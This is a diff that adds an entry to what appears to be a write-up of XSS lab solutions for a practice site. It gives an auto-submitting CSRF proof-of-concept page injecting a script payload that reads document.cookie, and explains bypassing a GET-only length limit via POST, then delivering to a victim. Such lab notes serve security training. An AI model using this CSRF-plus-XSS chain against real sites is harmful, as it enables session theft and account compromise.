@@ -586,6 +586,36 @@ From <img+src%3Dx+onerror%3Dalert%28document.cookie%29> To <img src=x onerror=al
 
 ---
 
+### Lab 1319: Length Limit Bypass
+- **URL Lab**: https://hacky.uk/lab/1319
+- **Payload**: Host to the server
+```
+<html>
+<head>
+</head>
+<body>
+    <form id="poc" action="https://z7ased3u.hacky.uk/target.ftl" method="post">
+        enter your name:
+        <input type="text" name="msg" value="<script>alert(document.cookie)</script>">
+        <input type="submit">
+    </form>
+    <script>
+        document.getElementById('poc').submit();
+    </script>
+</body>
+</html>
+```
+- **Full URL**: 
+```
+https://eqh42jmm.hacky.uk/index.html
+```
+- **Description**: Protection max 15 limit only in GET request, we change the method to POST & inject payload in msg parameter
+That will be XSS in POST Method => create CSRF POC, Host in server, & deliver to victim
+when victim click, xss will trigger in their account => CSRF + POST XSS = Valid XSS
+
+---
+
+
 ## Adept Level
 
 ### Lab 5: Unicode XSS [Using Full-width Character]
